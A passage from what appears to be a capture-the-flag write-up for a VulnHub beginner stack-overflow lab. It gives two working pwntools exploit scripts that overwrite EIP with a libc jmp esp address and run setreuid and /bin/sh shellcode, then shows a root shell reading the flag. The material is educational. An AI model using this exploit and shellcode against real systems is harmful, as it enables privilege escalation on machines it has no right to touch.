0xf7f5661b : jmp esp
0xf7f566e3 : jmp esp
0xf7f567e3 : call esp
0xf7f56993 : jmp esp
0xf7f56b13 : jmp esp
--More--(25/141)
```

First address can be used or any other that has a `jmp esp` call. This can be checked by sending the address to the `EIP` register and checking if a `jmp esp` call is done.



Here usage of the `pwntools` library is done due how simple it is send the payload to the binary.

A final exploit should look something like this which would use `struct` python library to pack the `jmp esp` address to little endian. 

```python
#!/usr/bin/env python2

# offset = 16
# eip = 20
# libc jmpesp = jmpcall esp libc : 0xf7dd0bb1 - jmp esp;

from pwn import *
import struct

junk = "A" * 16
libc_jmpesp = 0xf7dd0bb1
libc_jmpesp = struct.pack("<I",libc_jmpesp)
nops = "\x90" * 10
shellcode = (
"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
"\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
"\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
) # setreuid(geteuid(),geteuid()),execve("/bin/sh",0,0) 34byte universal shellcode

payload = junk + libc_jmpesp + nops + shellcode

io = process('./levelFive')
io.sendline(payload)
io.interactive()
```

When the exploit is executed, an interactive session as root should be started.

```bash
level4@kali:~$ ./exploit.py
[+] Starting local process './levelFive': pid 3433
[*] Switching to interactive mode
Enter your input: Buf: AAAAAAAAAAAAAAAA\xb1\x0b����\x90\x90\x90\x90\x90\x90\x90j1X\x99̀\x89É�jFX̀\xb0\x0bhn/shh//bi\x89��̀
$ id; cat /root/root.txt
uid=0(root) gid=1004(level4) groups=1004(level4)
1d0b5[REDACTED]
$
```

Of course only `pwntools` library can be used to create a working PoC.

```python
#!/usr/bin/env python2
from pwn import *

payload = ''
payload += "A" * 16
payload += p32(0xf7dd0bb1)
payload += "\90" * 10
payload += asm(shellcraft.i386.linux.setreuid())
payload += asm(shellcraft.i386.linux.sh())

p = process('./levelFive')
p.sendline(payload)
p.interactive()
```

References:

[1]: https://www.vulnhub.com/entry/stack-overflows-for-beginners-101,290/	"IntroToStackOverflow"

<https://www.vulnhub.com/entry/stack-overflows-for-beginners-101,290/>

[2]: https://github.com/longld/peda

<https://github.com/longld/peda>

[3]: <http://shell-storm.org/shellcode/files/shellcode-399.php>
[4]: <https://www.exploit-db.com/shellcodes/46809>